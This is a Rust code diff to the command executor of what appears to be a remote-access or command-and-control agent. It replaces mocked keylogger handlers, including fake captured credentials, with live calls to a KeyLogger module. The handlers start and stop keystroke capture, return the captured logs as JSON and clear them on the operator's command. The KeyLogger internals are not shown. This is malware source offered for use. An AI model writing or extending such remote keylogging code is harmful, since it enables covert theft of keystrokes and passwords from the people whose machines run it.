@@ -1,8 +1,16 @@
 use log::{info, error};
 use std::process::Command;
 use std::time::Instant;
+use std::sync::OnceLock;
 use serde::{Deserialize, Serialize};
 use base64::Engine;
+use crate::keylogger::KeyLogger;
+
+static KEYLOGGER: OnceLock<KeyLogger> = OnceLock::new();
+
+fn get_keylogger() -> &'static KeyLogger {
+    KEYLOGGER.get_or_init(|| KeyLogger::new())
+}
 
 #[derive(Debug, Serialize, Deserialize, Clone)]
 pub enum CommandType {
@@ -435,55 +443,82 @@ impl Executor {
     }
 
     async fn keylogger_start() -> CommandResult {
-        info!("🔐 Keylogger start command received");
-        CommandResult {
-            command_type: "keylogger_start".to_string(),
-            status: "success".to_string(),
-            output: "Keylogger started successfully".to_string(),
-            error: None,
-            execution_time_ms: 0,
+        let kl = get_keylogger();
+        match kl.start().await {
+            Ok(()) => CommandResult {
+                command_type: "keylogger_start".to_string(),
+                status: "success".to_string(),
+                output: "Keylogger started".to_string(),
+                error: None,
+                execution_time_ms: 0,
+            },
+            Err(e) => CommandResult {
+                command_type: "keylogger_start".to_string(),
+                status: "error".to_string(),
+                output: String::new(),
+                error: Some(e),
+                execution_time_ms: 0,
+            },
         }
     }
 
     async fn keylogger_stop() -> CommandResult {
-        info!("🔐 Keylogger stop command received");
-        CommandResult {
-            command_type: "keylogger_stop".to_string(),
-            status: "success".to_string(),
-            output: "Keylogger stopped successfully".to_string(),
-            error: None,
-            execution_time_ms: 0,
+        let kl = get_keylogger();
+        match kl.stop().await {
+            Ok(()) => CommandResult {
+                command_type: "keylogger_stop".to_string(),
+                status: "success".to_string(),
+                output: "Keylogger stopped".to_string(),
+                error: None,
+                execution_time_ms: 0,
+            },
+            Err(e) => CommandResult {
+                command_type: "keylogger_stop".to_string(),
+                status: "error".to_string(),
+                output: String::new(),
+                error: Some(e),
+                execution_time_ms: 0,
+            },
         }
     }
 
     async fn keylogger_logs() -> CommandResult {
-        info!("🔐 Keylogger logs command received");
-
-        let mock_logs = vec![
-            "[admin] username",
-            "[admin] password123",
-            "[ENTER]",
-            "secret data here",
-            "[CTRL+C]",
-        ].join("\n");
-
-        CommandResult {
-            command_type: "keylogger_logs".to_string(),
-            status: "success".to_string(),
-            output: format!("=== KEYLOGGER LOGS ===\n{}\n\nTotal: 5 keys logged", mock_logs),
-            error: None,
-            execution_time_ms: 0,
+        let kl = get_keylogger();
+        match kl.get_logs_json().await {
+            Ok(json) => CommandResult {
+                command_type: "keylogger_logs".to_string(),
+                status: "success".to_string(),
+                output: json,
+                error: None,
+                execution_time_ms: 0,
+            },
+            Err(e) => CommandResult {
+                command_type: "keylogger_logs".to_string(),
+                status: "error".to_string(),
+                output: String::new(),
+                error: Some(e),
+                execution_time_ms: 0,
+            },
         }
     }
 
     async fn keylogger_clear() -> CommandResult {
-        info!("🔐 Keylogger clear command received");
-        CommandResult {
-            command_type: "keylogger_clear".to_string(),
-            status: "success".to_string(),
-            output: "Keylogger logs cleared (removed 1250 entries)".to_string(),
-            error: None,
-            execution_time_ms: 0,
+        let kl = get_keylogger();
+        match kl.clear_logs().await {
+            Ok(count) => CommandResult {
+                command_type: "keylogger_clear".to_string(),
+                status: "success".to_string(),
+                output: format!("Cleared {} entries", count),
+                error: None,
+                execution_time_ms: 0,
+            },
+            Err(e) => CommandResult {
+                command_type: "keylogger_clear".to_string(),
+                status: "error".to_string(),
+                output: String::new(),
+                error: Some(e),
+                execution_time_ms: 0,
+            },
         }
     }
 
